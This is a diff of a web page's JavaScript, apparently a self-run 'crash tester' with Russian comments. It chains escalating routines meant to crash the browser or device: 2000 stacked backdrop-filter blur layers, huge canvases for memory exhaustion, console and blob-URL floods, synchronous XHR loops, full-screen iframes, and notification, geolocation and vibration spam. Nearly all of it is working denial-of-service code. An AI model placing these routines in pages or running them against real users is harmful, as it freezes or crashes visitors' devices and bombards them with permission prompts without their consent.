+                    svg.setAttribute('width','1'); svg.setAttribute('height','1');
+                    let f=''; for(let i=0;i<40;i++) f+=`<feGaussianBlur stdDeviation="${i}"/>`;
+                    svg.innerHTML = `<filter id="f">${f}</filter><rect filter="url(#f)" width="1" height="1"/>`;
+                    document.body.appendChild(svg);
+                    await sleep(300); svg.remove();
+                } catch(e) {}
+            }},
+            { name: 'Console log flood (10k)', run: async () => {
+                for(let i=0;i<10000;i++) console.log('crash',i);
+                await sleep(50);
+            }},
+            { name: 'Geolocation watch spam', run: async () => {
+                if(navigator.geolocation) for(let i=0;i<15;i++) navigator.geolocation.watchPosition(()=>{},()=>{},{timeout:80});
+                await sleep(150);
+            }},
+            { name: 'Notification request spam', run: async () => {
+                if('Notification' in window) for(let i=0;i<10;i++) Notification.requestPermission();
+                await sleep(100);
+            }},
+            { name: 'Vibration API insanity', run: async () => {
+                if(navigator.vibrate) navigator.vibrate([1,60,1,60,1,60,1,60,1,60]);
+                await sleep(100);
+            }},
+            { name: 'Performance.now storm', run: async () => {
+                for(let i=0;i<50000;i++) performance.now();
+                await sleep(100);
+            }},
+            { name: 'Fetch loop (parallel)', run: async () => {
+                for(let i=0;i<30;i++) fetch('data:,'+Math.random()).catch(()=>{});
+                await sleep(200);
+            }},
+            { name: 'XHR sync spam', run: async () => {
+                for(let i=0;i<15;i++) { const x=new XMLHttpRequest(); x.open('GET','data:,',false); try{x.send();}catch(e){} }
+                await sleep(100);
+            }},
+            { name: 'Blob URL explosion', run: async () => {
+                try {
+                    const b = new Blob([new ArrayBuffer(200000)]);
+                    for(let i=0;i<80;i++) URL.createObjectURL(b);
+                } catch(e) {} await sleep(100);
+            }},
+        ];
+
+        const highProbabilityLayers = [
+            { name: 'Backdrop-filter DOOMSDAY (2000 layers)', run: async () => {
+                const a = document.createElement('div');
+                a.id='doom'; a.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;pointer-events:none;';
+                document.body.appendChild(a);
+                for(let i=0; i<2000; i++) {
+                    const d = document.createElement('div');
+                    d.style.cssText = `position:fixed;top:0;left:0;width:100vw;height:100vh;backdrop-filter:blur(${140+Math.sin(i)*30}px) brightness(1.3) contrast(1.4);-webkit-backdrop-filter:blur(${140+Math.sin(i)*30}px);opacity:0.95;transform:translate3d(${i*0.3}px,${i*0.2}px,${i*0.5}px) scale(${1+i*0.0004});z-index:${9999+i};animation:spin2 ${3+i*0.01}s linear infinite;`;
+                    a.appendChild(d);
+                }
+                const st = document.createElement('style');
+                st.textContent = '@keyframes spin2 { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }';
+                document.head.appendChild(st);
+                await sleep(2500); // даём время на убийство
+            }},
+            { name: 'Memory exhaust via huge canvas (2x)', run: async () => {
+                try {
+                    const c = document.createElement('canvas'); c.width=8192; c.height=8192;
+                    const ctx = c.getContext('2d');
+                    ctx.fillStyle = 'red'; ctx.fillRect(0,0,8192,8192);
+                    const c2 = document.createElement('canvas'); c2.width=8192; c2.height=8192;
+                    const ctx2 = c2.getContext('2d');
+                    ctx2.fillStyle = 'blue'; ctx2.fillRect(0,0,8192,8192);
+                } catch(e) {} await sleep(200);
+            }},
+            { name: 'Final nuclear: recursive iframe creation', run: async () => {
+                // Создаём несколько iframe с тяжёлым содержимым
+                for(let i=0; i<5; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:99999;';
+                    iframe.srcdoc = '<html><body style="background:red;"><div style="backdrop-filter:blur(100px);width:100%;height:100%;"></div></body></html>';
+                    document.body.appendChild(iframe);
+                }
+                await sleep(500);
+            }}
+        ];
+
+        // Собираем все слои по порядку
+        const allLayers = [
+            ...lowProbabilityLayers.map(l => ({...l, group: 'low'})),
+            ...mediumProbabilityLayers.map(l => ({...l, group: 'medium'})),
+            ...highProbabilityLayers.map(l => ({...l, group: 'high'}))
+        ];
+
+        // ==================== ИСПОЛНЕНИЕ С УМНЫМ ЛОГИРОВАНИЕМ ====================
+        async function executeLayersInOrder() {
+            layerProgress.textContent = `0 / ${allLayers.length}`;
+            for (let i=0; i<allLayers.length; i++) {
+                const layer = allLayers[i];
+                // Обновляем статус до running и сохраняем
+                updateLayerInSession(layer.name, 'running');
+                statusText.textContent = `[${i+1}/${allLayers.length}] ${layer.name} (${layer.group} prob)`;
+                layerProgress.textContent = `${i+1} / ${allLayers.length}`;
                 try {
                     await layer.run();
-                    addLayerToSession(layer.name, 'completed');
+                    // Если успешно завершился
+                    updateLayerInSession(layer.name, 'completed');
                 } catch (e) {
-                    addLayerToSession(layer.name, 'completed');
+                    // Ошибка выполнения (не краш)
+                    updateLayerInSession(layer.name, 'error');
                 }
-                await sleep(60); // пауза между слоями
+                await sleep(20);
             }
-            // Если устоял
-            addLayerToSession('All layers finished (device survived!)', 'completed');
-            currentSession.status = 'completed';
-            saveSessions(loadSessions().map(s => s.id === currentSession.id ? currentSession : s));
-            statusText.textContent = 'Устройство выдержало всё. Невероятно!';
+            // Если дошли сюда – устройство выжило (почти невозможно)
+            statusText.textContent = 'Все слои завершены. Устройство выстояло.';
             layerProgress.textContent = '';
             tintOverlay.classList.remove('active');
-            runBtn.disabled = false;
-            showHistory();
+            confirmBtn.disabled = false;
+            runBtn.style.display = 'block';
+            confirmBox.style.display = 'none';
+            finishSession('completed');
+            displayHistory();
         }
     </script>
 </body>
